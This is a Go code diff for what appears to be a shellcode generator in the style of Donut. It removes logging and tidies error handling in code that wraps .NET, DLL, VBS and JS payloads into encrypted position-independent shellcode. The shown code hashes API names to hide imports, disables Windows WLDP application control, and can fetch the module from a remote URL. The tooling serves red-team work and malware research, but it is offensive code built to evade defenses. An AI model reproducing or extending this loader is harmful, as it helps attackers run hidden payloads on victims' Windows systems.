@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"encoding/binary"
 	"io/ioutil"
-	"log"
 	"path/filepath"
 	"strings"
 )
@@ -70,13 +69,15 @@ func ShellcodeFromBytes(buf *bytes.Buffer, config *Config) (*bytes.Buffer, error
 	}
 	// If the module will be stored on a remote server
 	if config.InstType == InstanceURL {
-		log.Printf("Saving %s to disk.\n", config.ModuleName)
 		// save the module to disk using random name
 		instance.Write([]byte{0, 0, 0, 0, 0, 0, 0, 0})          // mystery padding
 		config.ModuleData.Write([]byte{0, 0, 0, 0, 0, 0, 0, 0}) // mystery padding
-		ioutil.WriteFile(config.ModuleName, config.ModuleData.Bytes(), 0644)
+		err = ioutil.WriteFile(config.ModuleName, config.ModuleData.Bytes(), 0644)
+		if err != nil {
+			return nil, err
+		}
 	}
-	//ioutil.WriteFile("newinst.bin", instance.Bytes(), 0644)
+	// ioutil.WriteFile("newinst.bin", instance.Bytes(), 0644)
 	return Sandwich(config.Arch, instance)
 }
 
@@ -95,7 +96,7 @@ func Sandwich(arch Arch, payload *bytes.Buffer) (*bytes.Buffer, error) {
 	w := new(bytes.Buffer)
 	instanceLen := uint32(payload.Len())
 	w.WriteByte(0xE8)
-	binary.Write(w, binary.LittleEndian, instanceLen)
+	_ = binary.Write(w, binary.LittleEndian, instanceLen)
 	if _, err := payload.WriteTo(w); err != nil {
 		return nil, err
 	}
@@ -119,7 +120,7 @@ func Sandwich(arch Arch, payload *bytes.Buffer) (*bytes.Buffer, error) {
 		w.WriteByte(0x48) // dec ecx
 		w.WriteByte(0x0F) // js dword x86_code (skips length of x64 code)
 		w.WriteByte(0x88)
-		binary.Write(w, binary.LittleEndian, uint32(len(loaderX64)))
+		_ = binary.Write(w, binary.LittleEndian, uint32(len(loaderX64)))
 		w.Write(loaderX64)
 
 		w.Write([]byte{0x5A, // in between 32/64 stubs: pop edx
@@ -143,9 +144,9 @@ func CreateModule(config *Config, inputFile *bytes.Buffer) error {
 
 	mod := new(Module)
 	mod.ModType = uint32(config.Type)
-	mod.Thread = uint32(config.Thread)
-	mod.Unicode = uint32(config.Unicode)
-	mod.Compress = uint32(config.Compress)
+	mod.Thread = config.Thread
+	mod.Unicode = config.Unicode
+	mod.Compress = config.Compress
 
 	if config.Type == ModuleNETDLL ||
 		config.Type == ModuleNETEXE {
@@ -158,21 +159,17 @@ func CreateModule(config *Config, inputFile *bytes.Buffer) error {
 		copy(mod.Domain[:], []byte(config.Domain)[:])
 
 		if config.Type == ModuleNETDLL {
-			log.Println("Class:", config.Class)
 			copy(mod.Cls[:], []byte(config.Class)[:])
-			log.Println("Method:", config.Method)
 			copy(mod.Method[:], []byte(config.Method)[:])
 		}
 		// If no runtime specified in configuration, use default
 		if config.Runtime == "" {
 			config.Runtime = "v2.0.50727"
 		}
-		log.Println("Runtime:", config.Runtime)
 		copy(mod.Runtime[:], []byte(config.Runtime)[:])
 	} else if config.Type == ModuleDLL && config.Method != "" {
 		// Unmanaged DLL? check for exported api
-		log.Println("DLL function:", config.Method)
-		copy(mod.Method[:], []byte(config.Method))
+		copy(mod.Method[:], config.Method)
 	}
 	mod.ZLen = 0
 	mod.Len = uint32(inputFile.Len())
@@ -199,8 +196,8 @@ func CreateModule(config *Config, inputFile *bytes.Buffer) error {
 
 	// read module into memory
 	b := new(bytes.Buffer)
-	mod.WriteTo(b)
-	inputFile.WriteTo(b)
+	mod.writeTo(b)
+	_, _ = inputFile.WriteTo(b)
 	config.ModuleData = b
 
 	// update configuration with pointer to module
@@ -219,12 +216,10 @@ func CreateInstance(config *Config) (*bytes.Buffer, error) {
 	// if this is a PIC instance, add the size of module
 	// that will be appended to the end of structure
 	if config.InstType == InstancePIC {
-		log.Printf("The size of module is %v bytes. Adding to size of instance.\n", modLen)
 		instLen += modLen
 	}
 
 	if config.Entropy == EntropyDefault {
-		log.Println("Generating random key for instance")
 		tk, err := RandomBytes(16)
 		if err != nil {
 			return nil, err
@@ -237,7 +232,6 @@ func CreateInstance(config *Config) (*bytes.Buffer, error) {
 		}
 		copy(inst.KeyCtr[:], tk)
 
-		log.Println("Generating random key for module")
 		tk, err = RandomBytes(16)
 		if err != nil {
 			return nil, err
@@ -250,11 +244,9 @@ func CreateInstance(config *Config) (*bytes.Buffer, error) {
 		}
 		copy(inst.ModKeyCtr[:], tk)
 
-		log.Println("Generating random string to verify decryption")
-		sbsig := RandomString(signatureLen)
-		copy(inst.Sig[:], []byte(sbsig))
+		sbSig := RandomString(signatureLen)
+		copy(inst.Sig[:], sbSig)
 
-		log.Println("Generating random IV for Maru hash")
 		iv, err := RandomBytes(maruIVLen)
 		if err != nil {
 			return nil, err
@@ -263,7 +255,6 @@ func CreateInstance(config *Config) (*bytes.Buffer, error) {
 
 		inst.Mac = Maru(inst.Sig[:], inst.Iv)
 	}
-	log.Println("Generating hashes for API using IV:", inst.Iv)
 
 	for cnt, c := range apiImports {
 		// calculate hash for DLL string
@@ -272,20 +263,14 @@ func CreateInstance(config *Config) (*bytes.Buffer, error) {
 		// calculate hash for API string.
 		// xor with DLL hash and store in instance
 		inst.Hash[cnt] = Maru([]byte(c.Name), inst.Iv) ^ dllHash
-
-		log.Printf("Hash for %s : %s = %x\n",
-			c.Module,
-			c.Name,
-			inst.Hash[cnt])
 	}
 	// save how many API to resolve
-	inst.ApiCount = uint32(len(apiImports))
-	copy(inst.DllNames[:], "ole32;oleaut32;wininet;mscoree;shell32")
+	inst.APICount = uint32(len(apiImports))
+	copy(inst.DLLNames[:], "ole32;oleaut32;wininet;mscoree;shell32")
 
 	// if module is .NET assembly
 	if config.Type == ModuleNETDLL ||
 		config.Type == ModuleNETEXE {
-		log.Println("Copying GUID structures and DLL strings for loading .NET assemblies")
 		copy(inst.XIIDAppDomain[:], xIIDAppDomain[:])
 		copy(inst.XIIDICLRMetaHost[:], xIIDICLRMetaHost[:])
 		copy(inst.XCLSIDCLRMetaHost[:], xCLSIDCLRMetaHost[:])
@@ -294,7 +279,6 @@ func CreateInstance(config *Config) (*bytes.Buffer, error) {
 		copy(inst.XCLSIDCorRuntimeHost[:], xCLSIDCorRuntimeHost[:])
 	} else if config.Type == ModuleVBS ||
 		config.Type == ModuleJS {
-		log.Println("Copying GUID structures and DLL strings for loading VBS/JS")
 
 		copy(inst.XIIDIUnknown[:], xIIDIUnknown[:])
 		copy(inst.XIIDIDispatch[:], xIIDIDispatch[:])
@@ -331,7 +315,7 @@ func CreateInstance(config *Config) (*bytes.Buffer, error) {
 			"_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv")
 	}
 	if config.Thread != 0 {
-		copy(inst.ExitApi[:], "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit")
+		copy(inst.ExitAPI[:], "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit")
 	}
 	// required to disable WLDP
 	copy(inst.WLDP[:], "wldp")
@@ -339,7 +323,7 @@ func CreateInstance(config *Config) (*bytes.Buffer, error) {
 	copy(inst.WldpIsApproved[:], "WldpIsClassInApprovedList")
 
 	// set the type of instance we're creating
-	inst.Type = uint32(int(config.InstType))
+	inst.Type = uint32(config.InstType)
 
 	// indicate if we should call RtlExitUserProcess to terminate host process
 	inst.ExitOpt = config.ExitOpt
@@ -356,17 +340,14 @@ func CreateInstance(config *Config) (*bytes.Buffer, error) {
 				// generate a random name for module
 				// that will be saved to disk
 				config.ModuleName = RandomString(maxModuleName)
-				log.Println("Generated random name for module :", config.ModuleName)
 			} else {
 				config.ModuleName = "AAAAAAAA"
 			}
 		}
-		log.Println("Setting URL parameters")
 		// append module name
-		copy(inst.Url[:], config.URL+"/"+config.ModuleName)
+		copy(inst.URL[:], config.URL+"/"+config.ModuleName)
 		// set the request verb
 		copy(inst.Req[:], "GET")
-		log.Println("Payload will attempt download from:", string(inst.Url[:]))
 	}
 
 	inst.ModuleLen = uint64(modLen) + 8
@@ -375,7 +356,6 @@ func CreateInstance(config *Config) (*bytes.Buffer, error) {
 	config.instLen = instLen
 
 	if config.InstType == InstanceURL && config.Entropy == EntropyDefault {
-		log.Println("encrypting module for download")
 		config.ModuleMac = Maru(inst.Sig[:], inst.Iv)
 		config.ModuleData = bytes.NewBuffer(Encrypt(
 			inst.ModKeyMk[:],
@@ -383,7 +363,7 @@ func CreateInstance(config *Config) (*bytes.Buffer, error) {
 			config.ModuleData.Bytes()))
 		b := new(bytes.Buffer)
 		inst.Len = instLen - 8 /* magic padding */
-		inst.WriteTo(b)
+		inst.writeTo(b)
 		for uint32(b.Len()) < instLen-16 /* magic padding */ {
 			b.WriteByte(0)
 		}
@@ -391,9 +371,9 @@ func CreateInstance(config *Config) (*bytes.Buffer, error) {
 	}
 	// else if config.InstType == InstancePIC
 	b := new(bytes.Buffer)
-	inst.WriteTo(b)
+	inst.writeTo(b)
 	if _, err := config.ModuleData.WriteTo(b); err != nil {
-		log.Fatal(err)
+		return nil, err
 	}
 	for uint32(b.Len()) < config.instLen {
 		b.WriteByte(0)
@@ -401,7 +381,6 @@ func CreateInstance(config *Config) (*bytes.Buffer, error) {
 	if config.Entropy != EntropyDefault {
 		return b, nil
 	}
-	log.Println("encrypting instance")
 	instData := b.Bytes()
 	offset := 4 + // Len uint32
 		cipherKeyLen + cipherBlockLen + // Instance Crypt
@@ -418,11 +397,10 @@ func CreateInstance(config *Config) (*bytes.Buffer, error) {
 		instData[offset:])
 
 	bc := new(bytes.Buffer)
-	binary.Write(bc, binary.LittleEndian, instData[:offset]) // unencrypted header
-	if _, err := bc.Write(encInstData); err != nil {         // encrypted body
-		log.Fatal(err)
+	_ = binary.Write(bc, binary.LittleEndian, instData[:offset]) // unencrypted header
+	if _, err := bc.Write(encInstData); err != nil {             // encrypted body
+		return nil, err
 	}
-	log.Println("Leaving.")
 	return bc, nil
 }
 
